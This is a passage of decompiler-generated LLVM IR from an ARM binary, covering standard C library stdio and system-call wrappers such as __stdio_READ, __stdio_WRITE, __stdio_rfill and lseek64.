  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18240 = load i32, i32* @r4, align 4
  store i32 %v3_18240, i32* %stack_var_-12, align 4
  %v0_18244 = load i32, i32* %r0.global-to-local, align 4
  %v1_18244 = inttoptr i32 %v0_18244 to i16*
  %v2_18244 = load i16, i16* %v1_18244, align 2
  %v3_18244 = zext i16 %v2_18244 to i32
  store i32 %v3_18244, i32* @r3, align 4
  %v1_18248 = and i32 %v3_18244, 4
  store i32 %v1_18248, i32* @r5, align 4
  %v2_18248 = icmp eq i32 %v1_18248, 0
  store i32 %v0_18244, i32* @r4, align 4
  br i1 %v2_18248, label %dec_label_pc_1825c, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_1825c:                               ; preds = %entry
  %v1_1825c = icmp slt i32 %arg2, 0
  br i1 %v1_1825c, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_1825c
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_1825c, %bb18
  %v1_18264 = add i32 %v0_18244, 4
  %v2_18264 = inttoptr i32 %v1_18264 to i32*
  %v3_18264 = load i32, i32* %v2_18264, align 4
  store i32 %v3_18264, i32* %r0.global-to-local, align 4
  %v1_18268 = call i32 @__libc_read(i32 %v3_18264)
  store i32 %v1_18268, i32* %r0.global-to-local, align 4
  %v5_18270 = icmp sgt i32 %v1_18268, 0
  br i1 %v5_18270, label %.thread7, label %dec_label_pc_18274

dec_label_pc_18274:                               ; preds = %bb19
  %v2_1826c = icmp eq i32 %v1_18268, 0
  %v0_18274 = load i32, i32* @r4, align 4
  %v1_18274 = inttoptr i32 %v0_18274 to i16*
  %v2_18274 = load i16, i16* %v1_18274, align 2
  br i1 %v2_1826c, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_18274
  %v2_18278 = or i16 %v2_18274, 4
  store i16 %v2_18278, i16* %v1_18274, align 2
  %v1_18294.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_18274
  %v2_1827c = or i16 %v2_18274, 8
  store i16 %v2_1827c, i16* %v1_18274, align 2
  %v1_18288 = load i32, i32* @r5, align 4
  store i32 %v1_18288, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_18294 = phi i32 [ %v1_18294.pre, %bb20 ], [ 0, %bb ], [ %v1_18268, %bb19 ], [ %v1_18288, %bb21 ]
  %v2_18290 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18290, i32* @r4, align 4
  ret i32 %v1_18294

; uselistorder directives
  uselistorder i16 %v2_18274, { 1, 0 }
  uselistorder i32 %v1_18268, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_1835c2 = icmp eq i32 %arg3, 0
  store i1 %v2_1835c2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1835c2, label %dec_label_pc_18364, label %dec_label_pc_182b4

dec_label_pc_182b4:                               ; preds = %entry, %dec_label_pc_1835cthread-pre-split.dec_label_pc_182b4_crit_edge
  %v0_182c0 = phi i32 [ %v0_182c0.pre, %dec_label_pc_1835cthread-pre-split.dec_label_pc_182b4_crit_edge ], [ %tmp, %entry ]
  %v0_182bc = phi i32 [ %v5_182cc, %dec_label_pc_1835cthread-pre-split.dec_label_pc_182b4_crit_edge ], [ %arg2, %entry ]
  %v3_182b4 = phi i32 [ %v3_182b4.pre, %dec_label_pc_1835cthread-pre-split.dec_label_pc_182b4_crit_edge ], [ 2147483647, %entry ]
  %v0_182b8.in = phi i32 [ %v5_182d0, %dec_label_pc_1835cthread-pre-split.dec_label_pc_182b4_crit_edge ], [ %arg3, %entry ]
  %v3_182b8 = phi i32 [ %v5_182d0, %dec_label_pc_1835cthread-pre-split.dec_label_pc_182b4_crit_edge ], [ %arg3, %entry ]
  %v0_182b8 = icmp slt i32 %v0_182b8.in, 0
  %storemerge = select i1 %v0_182b8, i32 %v3_182b4, i32 %v3_182b8
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_182bc, i32* %r1.global-to-local, align 4
  %v1_182c0 = add i32 %v0_182c0, 4
  %v2_182c0 = inttoptr i32 %v1_182c0 to i32*
  %v3_182c0 = load i32, i32* %v2_182c0, align 4
  %v3_182c4 = call i32 @__GI___libc_write(i32 %v3_182c0, i32 %v0_182bc)
  %v1_182c8 = icmp slt i32 %v3_182c4, 0
  %v2_182c8 = icmp eq i32 %v3_182c4, 0
  store i1 %v2_182c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_182c8, label %dec_label_pc_182d8, label %dec_label_pc_1835cthread-pre-split

dec_label_pc_182d8:                               ; preds = %dec_label_pc_182b4
  %v0_182d8 = load i32, i32* @r4, align 4
  %v1_182d8 = inttoptr i32 %v0_182d8 to i16*
  %v2_182d8 = load i16, i16* %v1_182d8, align 2
  %v1_182dc = or i16 %v2_182d8, 8
  store i16 %v1_182dc, i16* %v1_182d8, align 2
  store i32 40808, i32* %r3.global-to-local, align 4
  %v0_182e8 = call i32 @__aeabi_read_tp()
  %v3_182ec = load i16, i16* @global_var_2225c.361, align 2
  %v4_182ec = sext i16 %v3_182ec to i32
  store i32 %v4_182ec, i32* %r3.global-to-local, align 4
  %v2_182f0 = add i32 %v4_182ec, %v0_182e8
  %v3_182f0 = inttoptr i32 %v2_182f0 to i32*
  %v4_182f0 = load i32, i32* %v3_182f0, align 4
  store i32 %v4_182f0, i32* %r3.global-to-local, align 4
  %v7_182f4 = icmp eq i32 %v4_182f0, 4
  store i1 %v7_182f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_182f4, label %dec_label_pc_18300, label %bb21

bb21:                                             ; preds = %dec_label_pc_182d8
  %v8_182f8 = icmp eq i32 %v4_182f0, 11
  store i1 %v8_182f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_182f8, label %dec_label_pc_18300, label %dec_label_pc_18364

dec_label_pc_18300:                               ; preds = %dec_label_pc_182d8, %bb21
  %v0_18300 = load i32, i32* @r4, align 4
  %v1_18300 = add i32 %v0_18300, 8
  store i32 %v1_18300, i32* %r2.global-to-local, align 4
  %v1_18304 = inttoptr i32 %v1_18300 to i32*
  %v2_18304 = load i32, i32* %v1_18304, align 4
  store i32 %v2_18304, i32* %r2.global-to-local, align 4
  %v3_18304 = add i32 %v0_18300, 12
  %v4_18304 = inttoptr i32 %v3_18304 to i32*
  %v5_18304 = load i32, i32* %v4_18304, align 4
  store i32 %v5_18304, i32* %r3.global-to-local, align 4
  %v2_18308 = sub i32 %v5_18304, %v2_18304
  store i32 %v2_18308, i32* %r1.global-to-local, align 4
  %v9_18308 = icmp eq i32 %v5_18304, %v2_18304
  store i1 %v9_18308, i1* %cpsr_z.global-to-local, align 1
  %v0_18354.pre = load i32, i32* @r5, align 4
  br i1 %v9_18308, label %dec_label_pc_18354, label %dec_label_pc_18310

dec_label_pc_18310:                               ; preds = %dec_label_pc_18300
  %v3_18310 = icmp ult i32 %v2_18308, %v0_18354.pre
  %v9_18310 = icmp eq i32 %v2_18308, %v0_18354.pre
  store i1 %v9_18310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18310, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_18310
  store i32 %v0_18354.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_18310, %bb22, %dec_label_pc_18338
  %v2_18324 = phi i32 [ %v1_1833c, %dec_label_pc_18338 ], [ %v2_18304, %bb22 ], [ %v2_18304, %dec_label_pc_18310 ]
  %v0_18318 = load i32, i32* @r6, align 4
  %v1_18318 = inttoptr i32 %v0_18318 to i8*
  %v2_18318 = load i8, i8* %v1_18318, align 1
  %v3_18318 = zext i8 %v2_18318 to i32
  store i32 %v3_18318, i32* %r3.global-to-local, align 4
  %v7_1831c = icmp eq i8 %v2_18318, 10
  store i1 %v7_1831c, i1* %cpsr_z.global-to-local, align 1
  %v1_18320 = add i32 %v0_18318, 1
  store i32 %v1_18320, i32* @r6, align 4
  %v3_18324 = inttoptr i32 %v2_18324 to i8*
  store i8 %v2_18318, i8* %v3_18324, align 1
  %v0_18328 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18328, label %dec_label_pc_1832c, label %dec_label_pc_18338

dec_label_pc_1832c:                               ; preds = %.preheader
  %v0_1832c = load i32, i32* @r4, align 4
  %v1_1832c = inttoptr i32 %v0_1832c to i16*
  %v2_1832c = load i16, i16* %v1_1832c, align 2
  %v3_1832c = zext i16 %v2_1832c to i32
  store i32 %v3_1832c, i32* %r3.global-to-local, align 4
  %v1_18330 = and i32 %v3_1832c, 256
  %v2_18330 = icmp eq i32 %v1_18330, 0
  store i1 %v2_18330, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18330, label %dec_label_pc_18338, label %dec_label_pc_1832c.dec_label_pc_18344_crit_edge

dec_label_pc_1832c.dec_label_pc_18344_crit_edge:  ; preds = %dec_label_pc_1832c
  %v0_18348.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18344

dec_label_pc_18338:                               ; preds = %dec_label_pc_1832c, %.preheader
  %v0_18338 = load i32, i32* %r1.global-to-local, align 4
  %v1_18338 = add i32 %v0_18338, -1
  store i32 %v1_18338, i32* %r1.global-to-local, align 4
  %v7_18338 = icmp eq i32 %v0_18338, 1
  store i1 %v7_18338, i1* %cpsr_z.global-to-local, align 1
  %v0_1833c = load i32, i32* %r2.global-to-local, align 4
  %v1_1833c = add i32 %v0_1833c, 1
  store i32 %v1_1833c, i32* %r2.global-to-local, align 4
  br i1 %v7_18338, label %dec_label_pc_18338.dec_label_pc_18344_crit_edge, label %.preheader

dec_label_pc_18338.dec_label_pc_18344_crit_edge:  ; preds = %dec_label_pc_18338
  %v0_18344.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18344

dec_label_pc_18344:                               ; preds = %dec_label_pc_1832c.dec_label_pc_18344_crit_edge, %dec_label_pc_18338.dec_label_pc_18344_crit_edge
  %v0_18348 = phi i32 [ %v1_1833c, %dec_label_pc_18338.dec_label_pc_18344_crit_edge ], [ %v0_18348.pre, %dec_label_pc_1832c.dec_label_pc_18344_crit_edge ]
  %v0_18344 = phi i32 [ %v0_18344.pre, %dec_label_pc_18338.dec_label_pc_18344_crit_edge ], [ %v0_1832c, %dec_label_pc_1832c.dec_label_pc_18344_crit_edge ]
  %v1_18344 = add i32 %v0_18344, 8
  %v2_18344 = inttoptr i32 %v1_18344 to i32*
  %v3_18344 = load i32, i32* %v2_18344, align 4
  store i32 %v3_18344, i32* %r3.global-to-local, align 4
  %v2_18348 = add i32 %v0_18344, 16
  %v3_18348 = inttoptr i32 %v2_18348 to i32*
  store i32 %v0_18348, i32* %v3_18348, align 4
  %v0_1834c = load i32, i32* %r3.global-to-local, align 4
  %v1_1834c = load i32, i32* %r2.global-to-local, align 4
  %v2_1834c = sub i32 %v1_1834c, %v0_1834c
  store i32 %v2_1834c, i32* %r3.global-to-local, align 4
  %v1_18350 = load i32, i32* @r5, align 4
  %v2_18350 = sub i32 %v1_18350, %v2_1834c
  br label %dec_label_pc_18354

dec_label_pc_18354:                               ; preds = %dec_label_pc_18300, %dec_label_pc_18344
  %v0_18354 = phi i32 [ %v2_18350, %dec_label_pc_18344 ], [ %v0_18354.pre, %dec_label_pc_18300 ]
  %v1_18354 = load i32, i32* @r7, align 4
  %v2_18354 = sub i32 %v1_18354, %v0_18354
  store i32 %v2_18354, i32* @r7, align 4
  br label %dec_label_pc_18364

dec_label_pc_1835cthread-pre-split:               ; preds = %dec_label_pc_182b4
  %v3_182cc = load i32, i32* @r6, align 4
  %v5_182cc = add i32 %v3_182cc, %v3_182c4
  store i32 %v5_182cc, i32* @r6, align 4
  %v4_182d0 = load i32, i32* @r5, align 4
  %v5_182d0 = sub i32 %v4_182d0, %v3_182c4
  store i32 %v5_182d0, i32* @r5, align 4
  %v2_1835c = icmp eq i32 %v5_182d0, 0
  store i1 %v2_1835c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1835c, label %dec_label_pc_18364, label %dec_label_pc_1835cthread-pre-split.dec_label_pc_182b4_crit_edge

dec_label_pc_1835cthread-pre-split.dec_label_pc_182b4_crit_edge: ; preds = %dec_label_pc_1835cthread-pre-split
  %v3_182b4.pre = load i32, i32* @r8, align 4
  %v0_182c0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_182b4

dec_label_pc_18364:                               ; preds = %dec_label_pc_1835cthread-pre-split, %entry, %bb21, %dec_label_pc_18354
  %v0_18364 = load i32, i32* @r7, align 4
  ret i32 %v0_18364

; uselistorder directives
  uselistorder i32 %v5_182d0, { 1, 3, 0, 2 }
  uselistorder i32 %v5_182cc, { 1, 0 }
  uselistorder i32 %v0_18344, { 1, 0 }
  uselistorder i32 %v1_1833c, { 0, 2, 1 }
  uselistorder i32 %v0_18338, { 1, 0 }
  uselistorder i32 %v0_18354.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_18304, { 1, 0, 2 }
  uselistorder i32 %v2_18304, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_182c4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_182bc, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 10, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i8 10, { 2, 3, 0, 1 }
  uselistorder i32 11, { 12, 9, 10, 11, 19, 26, 27, 3, 4, 5, 13, 14, 15, 6, 16, 0, 17, 18, 20, 21, 7, 22, 8, 23, 1, 24, 2, 25, 28 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 2, 1, 0 }
  uselistorder i32 2147483647, { 1, 6, 7, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_18364, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_18354, { 1, 0 }
  uselistorder label %dec_label_pc_18344, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18300, { 1, 0 }
  uselistorder label %dec_label_pc_182b4, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18374 = load i32, i32* @r4, align 4
  store i32 %v3_18374, i32* %stack_var_-8, align 4
  %v1_18378 = add i32 %arg1, 8
  %v1_1837c = inttoptr i32 %v1_18378 to i32*
  %v2_1837c = load i32, i32* %v1_1837c, align 4
  store i32 %v2_1837c, i32* @r1, align 4
  %v3_1837c = add i32 %arg1, 12
  %v4_1837c = inttoptr i32 %v3_1837c to i32*
  %v5_1837c = load i32, i32* %v4_1837c, align 4
  %v2_18380 = sub i32 %v5_1837c, %v2_1837c
  store i32 %v2_18380, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_18388 = inttoptr i32 %arg1 to i16*
  %v4_18388 = call i32 @__stdio_READ(i16* %v3_18388, i32 %v2_1837c, i32 %v2_18380)
  %v0_1838c = load i32, i32* @r4, align 4
  %v1_1838c = add i32 %v0_1838c, 8
  %v2_1838c = inttoptr i32 %v1_1838c to i32*
  %v3_1838c = load i32, i32* %v2_1838c, align 4
  store i32 %v3_1838c, i32* %r2.global-to-local, align 4
  %v2_18390 = add i32 %v3_1838c, %v4_18388
  %v2_18394 = add i32 %v0_1838c, 20
  %v3_18394 = inttoptr i32 %v2_18394 to i32*
  store i32 %v2_18390, i32* %v3_18394, align 4
  %v0_18398 = load i32, i32* %r2.global-to-local, align 4
  %v1_18398 = load i32, i32* @r4, align 4
  %v2_18398 = add i32 %v1_18398, 16
  %v3_18398 = inttoptr i32 %v2_18398 to i32*
  store i32 %v0_18398, i32* %v3_18398, align 4
  %v2_1839c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1839c, i32* @r4, align 4
  ret i32 %v4_18388

; uselistorder directives
  uselistorder i32 %v4_18388, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_183a4 = load i32, i32* @r4, align 4
  store i32 %v3_183a4, i32* %stack_var_-12, align 4
  %v0_183a8 = load i32, i32* @r0, align 4
  %v1_183a8 = inttoptr i32 %v0_183a8 to i16*
  %v2_183a8 = load i16, i16* %v1_183a8, align 2
  %v3_183a8 = zext i16 %v2_183a8 to i32
  store i32 %v3_183a8, i32* %r3.global-to-local, align 4
  %v0_183ac = load i32, i32* @r1, align 4
  %v2_183ac = and i32 %v0_183ac, %v3_183a8
  %v4_183ac = icmp eq i32 %v2_183ac, 0
  store i32 %v0_183a8, i32* @r4, align 4
  br i1 %v4_183ac, label %dec_label_pc_183bc, label %dec_label_pc_183cc

dec_label_pc_183bc:                               ; preds = %entry
  %v1_183bc = and i32 %v3_183a8, 2176
  %v2_183bc = icmp eq i32 %v1_183bc, 0
  br i1 %v2_183bc, label %dec_label_pc_183c4, label %dec_label_pc_183d8

dec_label_pc_183c4:                               ; preds = %dec_label_pc_183bc
  %v2_183c4 = or i32 %v0_183ac, %v3_183a8
  store i32 %v2_183c4, i32* %r3.global-to-local, align 4
  %v1_183c8 = trunc i32 %v2_183c4 to i16
  store i16 %v1_183c8, i16* %v1_183a8, align 2
  %v0_183cc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_183cc

dec_label_pc_183cc:                               ; preds = %entry, %dec_label_pc_183c4
  %v0_183cc = phi i32 [ %v0_183a8, %entry ], [ %v0_183cc.pre, %dec_label_pc_183c4 ]
  %v1_183cc = inttoptr i32 %v0_183cc to i16*
  %v2_183cc = load i16, i16* %v1_183cc, align 2
  %v3_183cc = zext i16 %v2_183cc to i32
  store i32 %v3_183cc, i32* %r3.global-to-local, align 4
  %v1_183d0 = and i32 %v3_183cc, 16
  store i32 %v1_183d0, i32* %r5.global-to-local, align 4
  %v2_183d0 = icmp eq i32 %v1_183d0, 0
  br i1 %v2_183d0, label %dec_label_pc_18400, label %dec_label_pc_183d8

dec_label_pc_183d8:                               ; preds = %dec_label_pc_183bc, %dec_label_pc_183cc
  store i32 40564, i32* %r3.global-to-local, align 4
  %v0_183dc = call i32 @__aeabi_read_tp()
  store i32 %v0_183dc, i32* %r0.global-to-local, align 4
  %v3_183e0 = load i16, i16* @global_var_2225c.361, align 2
  %v4_183e0 = sext i16 %v3_183e0 to i32
  store i32 %v4_183e0, i32* %r3.global-to-local, align 4
  %v3_183e8 = add i32 %v4_183e0, %v0_183dc
  %v4_183e8 = inttoptr i32 %v3_183e8 to i32*
  store i32 9, i32* %v4_183e8, align 4
  br label %dec_label_pc_183ec

dec_label_pc_183ec:                               ; preds = %dec_label_pc_18408, %dec_label_pc_183d8
  %v0_183ec = load i32, i32* @r4, align 4
  %v1_183ec = inttoptr i32 %v0_183ec to i16*
  %v2_183ec = load i16, i16* %v1_183ec, align 2
  %v3_183ec = zext i16 %v2_183ec to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_183f4 = or i32 %v3_183ec, 8
  store i32 %v1_183f4, i32* %r3.global-to-local, align 4
  %v1_183f8 = trunc i32 %v1_183f4 to i16
  store i16 %v1_183f8, i16* %v1_183ec, align 2
  %v1_18440.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18438

dec_label_pc_18400:                               ; preds = %dec_label_pc_183cc
  %v1_18400 = and i32 %v3_183cc, 64
  %v2_18400 = icmp eq i32 %v1_18400, 0
  br i1 %v2_18400, label %dec_label_pc_18428, label %dec_label_pc_18408

dec_label_pc_18408:                               ; preds = %dec_label_pc_18400
  %v0_18408 = load i32, i32* @r0, align 4
  %v1_18408 = call i32 @__stdio_wcommit(i32 %v0_18408)
  store i32 %v1_18408, i32* %r0.global-to-local, align 4
  %v2_1840c = icmp eq i32 %v1_18408, 0
  br i1 %v2_1840c, label %dec_label_pc_18414, label %dec_label_pc_183ec

dec_label_pc_18414:                               ; preds = %dec_label_pc_18408
  %v0_18414 = load i32, i32* @r4, align 4
  %v1_18414 = inttoptr i32 %v0_18414 to i16*
  %v2_18414 = load i16, i16* %v1_18414, align 2
  %v3_18414 = zext i16 %v2_18414 to i32
  store i32 %v3_18414, i32* %r3.global-to-local, align 4
  %v1_18418 = add i32 %v0_18414, 8
  %v2_18418 = inttoptr i32 %v1_18418 to i32*
  %v3_18418 = load i32, i32* %v2_18418, align 4
  %v1_1841c = and i32 %v3_18414, 65471
  store i32 %v1_1841c, i32* %r3.global-to-local, align 4
  %v2_18420 = add i32 %v0_18414, 28
  %v3_18420 = inttoptr i32 %v2_18420 to i32*
  store i32 %v3_18418, i32* %v3_18420, align 4
  %v0_18424 = load i32, i32* %r3.global-to-local, align 4
  %v1_18424 = trunc i32 %v0_18424 to i16
  %v2_18424 = load i32, i32* @r4, align 4
  %v3_18424 = inttoptr i32 %v2_18424 to i16*
  store i16 %v1_18424, i16* %v3_18424, align 2
  %v0_18428.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18428

dec_label_pc_18428:                               ; preds = %dec_label_pc_18400, %dec_label_pc_18414
  %v2_18430 = phi i32 [ %v0_183cc, %dec_label_pc_18400 ], [ %v0_18428.pre, %dec_label_pc_18414 ]
  %v1_18428 = inttoptr i32 %v2_18430 to i16*
  %v2_18428 = load i16, i16* %v1_18428, align 2
  %v3_18428 = zext i16 %v2_18428 to i32
  %v1_1842c = or i32 %v3_18428, 1
  store i32 %v1_1842c, i32* %r3.global-to-local, align 4
  %v1_18430 = trunc i32 %v1_1842c to i16
  store i16 %v1_18430, i16* %v1_18428, align 2
  %v0_18434 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_18434, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18438

dec_label_pc_18438:                               ; preds = %dec_label_pc_183ec, %dec_label_pc_18428
  %v1_18440 = phi i32 [ %v1_18440.pre, %dec_label_pc_183ec ], [ %v0_18434, %dec_label_pc_18428 ]
  %v2_1843c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1843c, i32* @r4, align 4
  ret i32 %v1_18440

; uselistorder directives
  uselistorder i32 %v3_183a8, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18438, { 1, 0 }
  uselistorder label %dec_label_pc_18428, { 1, 0 }
  uselistorder label %dec_label_pc_183d8, { 1, 0 }
  uselistorder label %dec_label_pc_183cc, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_18448 = load i32, i32* @r4, align 4
  %v6_18448 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_18458 = call i32 @memcpy()
  %v0_1845c = load i32, i32* @r5, align 4
  %v1_1845c = load i32, i32* @r4, align 4
  %v2_1845c = add i32 %v1_1845c, %v0_1845c
  store i32 %v3_18448, i32* @r4, align 4
  store i32 %v6_18448, i32* @r5, align 4
  ret i32 %v2_1845c
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_1846c = load i32, i32* @r1, align 4
  %v2_1846c = icmp eq i32 %v0_1846c, 0
  %v3_18470 = load i32, i32* @r4, align 4
  store i32 %v3_18470, i32* %stack_var_-8, align 4
  %v0_18474 = load i32, i32* @r0, align 4
  store i32 %v0_18474, i32* %r4.global-to-local, align 4
  br i1 %v2_1846c, label %dec_label_pc_18498, label %dec_label_pc_1847c

dec_label_pc_1847c:                               ; preds = %entry
  %v1_18484 = add i32 %v0_18474, 260
  %v4_18488 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_18484)
  %v2_1848c = icmp eq i32 %v4_18488, 0
  br i1 %v2_1848c, label %dec_label_pc_1849c, label %dec_label_pc_18498

dec_label_pc_18498:                               ; preds = %dec_label_pc_1847c, %entry
  br label %dec_label_pc_1849c

dec_label_pc_1849c:                               ; preds = %dec_label_pc_1847c, %dec_label_pc_18498
  %storemerge = phi i32 [ 0, %dec_label_pc_18498 ], [ 1, %dec_label_pc_1847c ]
  %v1_184a0 = load i32, i32* %r4.global-to-local, align 4
  %v2_184a0 = add i32 %v1_184a0, 256
  %v3_184a0 = inttoptr i32 %v2_184a0 to i32*
  store i32 %storemerge, i32* %v3_184a0, align 4
  %v2_184a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_184a4, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 1, 2, 0 }
  uselistorder i32* null, { 9, 0, 5, 6, 1, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 23, 3, 24, 4, 25 }
  uselistorder i32 260, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1849c, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_184f4, label %dec_label_pc_184d8

dec_label_pc_184d8:                               ; preds = %entry
  %v0_184dc = call i32 @__aeabi_read_tp()
  %v3_184e0 = load i16, i16* @global_var_2225c.361, align 2
  %v4_184e0 = sext i16 %v3_184e0 to i32
  %v0_184e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_184e4 = sub i32 0, %v0_184e4
  store i32 %v1_184e4, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_184ec = add i32 %v4_184e0, %v0_184dc
  %v4_184ec = inttoptr i32 %v3_184ec to i32*
  store i32 %v1_184e4, i32* %v4_184ec, align 4
  %v0_184fc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_184fc

dec_label_pc_184f4:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_184f4 = icmp eq i32 %arg1, 0
  br i1 %v2_184f4, label %dec_label_pc_18508, label %dec_label_pc_184fc

dec_label_pc_184fc:                               ; preds = %dec_label_pc_184f4, %dec_label_pc_184d8
  %v0_184fc = phi i32 [ %arg1, %dec_label_pc_184f4 ], [ %v0_184fc.pre, %dec_label_pc_184d8 ]
  %v3_18500 = ashr i32 %v0_184fc, 31
  br label %dec_label_pc_1850c

dec_label_pc_18508:                               ; preds = %dec_label_pc_184f4
  br label %dec_label_pc_1850c

dec_label_pc_1850c:                               ; preds = %dec_label_pc_184fc, %dec_label_pc_18508
  %v1_18514 = phi i32 [ %v0_184fc, %dec_label_pc_184fc ], [ %tmp8, %dec_label_pc_18508 ]
  %storemerge = phi i32 [ %v3_18500, %dec_label_pc_184fc ], [ %tmp, %dec_label_pc_18508 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_18514

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 31, { 8, 6, 7, 0, 4, 1, 2, 3, 9, 10, 5 }
  uselistorder i16 8, { 3, 0, 1, 2, 4 }
  uselistorder i16* @global_var_2225c.361, { 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
